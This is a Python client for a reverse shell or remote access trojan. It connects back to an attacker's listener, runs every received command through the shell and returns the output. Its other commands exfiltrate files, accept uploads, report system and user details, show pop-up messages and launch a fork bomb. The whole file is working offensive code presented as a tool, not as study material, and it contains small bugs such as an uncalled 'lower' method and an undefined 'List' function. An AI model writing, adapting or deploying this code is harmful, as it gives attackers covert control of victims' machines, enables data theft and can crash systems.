#!/bin/python3

import socket
import subprocess
import os
import platform
import getpass
import colorama
import tqdm
import gi
gi.require_version("Notify", "0.7")
from gi.repository import Notify
from colorama import Fore, Style
from time import sleep

colorama.init()

SERVER_HOST = "127.0.0.1" #attack's address
SERVER_PORT = 5003 #attack's port
BUFFER_SIZE = 1024*4
SEPARATOR = "<SEPARATOR>"

def connection():
    global s
    s = socket.socket()
    while True:
    	try:
    	    s.connect((SERVER_HOST, SERVER_PORT))
    	except socket.error:
    	    sleep(5)
    	else:
    	    break

def upload():
    LOCAL_HOST = "127.0.0.1"
    LOCAL_PORT = 9999
    SEPARATOR = "<SEPARATOR>"

    s = socket.socket()
    s.bind((LOCAL_HOST, LOCAL_PORT))
    s.listen(5)
    print(f"[*] Listening as {LOCAL_HOST}:{LOCAL_PORT}")
    client_socket, address = s.accept() 
    print(f"[+] {address} is connected.")

    received = client_socket.recv(BUFFER_SIZE).decode()
    file_name, filesize = received.split(SEPARATOR)
    file_name = os.path.basename(file_name)
    filesize = int(filesize)
    progress = tqdm.tqdm(range(filesize), f"Receiving {file_name}", unit="B", unit_scale=True, unit_divisor=1024)
 
    with open(file_name, "wb") as f:
        for _ in progress:
            bytes_read = client_socket.recv(BUFFER_SIZE)
            if not bytes_read:    
                break
            f.write(bytes_read)
            progress.update(len(bytes_read))
    client_socket.close()
    s.close()

def download():
    
    host = SERVER_HOST
    port = 9999
    file_name = command.split(" ")[1]
    
    SEPARATOR = "<SEPARATOR>"
    filesize = os.path.getsize(file_name)
    s = socket.socket()
    s.connect((host, port))

    s.send(f"{file_name}{SEPARATOR}{filesize}".encode())

    progress = tqdm.tqdm(range(filesize), f"Sending {file_name}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(file_name, "rb") as f:
        for _ in progress:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
            s.sendall(bytes_read)

def message():
    
    loop = 0
    while loop == 0:
            message = s.recv(BUFFER_SIZE).decode()
            if message == "stop":
                loop = 1
            else:
                Notify.init("Message")
                Notification = Notify.Notification.new(message)
                Notification.show()
    print ("Press Enter once")

connection()

passphase = 0

while True: 
    
    command = s.recv(BUFFER_SIZE).decode()
    
    if command.lower() == "exit":
        s.close()
        passphase = 0
        break
        
    elif command.lower() == "message":
        message()

    elif command.split(" ")[0] == "cd":
        os.chdir(command.split(" ")[1])
        s.send("Changed Directory to {}".format(os.getcwd()).encode())
    
    elif command.split(" ")[0] == "download":
        download()

    elif command.lower == "sysinfo":
        
        sysinfo = f"""
        Operating System: {platform.system()}
        Computer Name: {platform.node()}
        Username: {getpass.getuser()}
        Release Version: {platform.release()}
        Processor Architecture: {platform.processor()}
        """
        s.send(sysinfo.encode())
        
    elif command == "forkbomb":
        while True:
            os.fork()
    
    elif command == "list":
        List()
    
    elif command == "upload":
        upload()
    
    elif command == "stop":
        passphase = 0
        s.close()
        connection()
    
    elif command.split(" ")[0] == "python_3":
        program = command.split(" ")[1]
        subprocess.Popen("python3 {}".format(program), shell=True)
            
    output = subprocess.getoutput(command)
    s.send(output.encode())

